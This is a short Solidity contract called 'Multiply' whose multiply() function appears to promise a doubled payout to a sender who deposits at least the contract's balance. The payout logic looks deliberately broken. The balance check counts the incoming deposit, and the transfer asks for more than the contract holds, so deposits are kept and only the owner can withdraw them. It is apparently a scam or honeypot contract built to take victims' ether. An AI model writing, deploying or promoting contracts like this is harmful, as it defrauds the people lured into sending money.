1 pragma solidity ^0.4.17;
2 contract Multiply {
3 
4     address public Owner = msg.sender;
5    
6     function() public payable{}
7    
8     function withdraw()
9     payable
10     public
11     {
12         require(msg.sender == Owner);
13         Owner.transfer(this.balance);
14     }
15     
16     function multiply(address adr)
17     public
18     payable
19     {
20         if(msg.value>=this.balance)
21         {        
22             adr.transfer(this.balance+msg.value);
23         }
24     }
25 }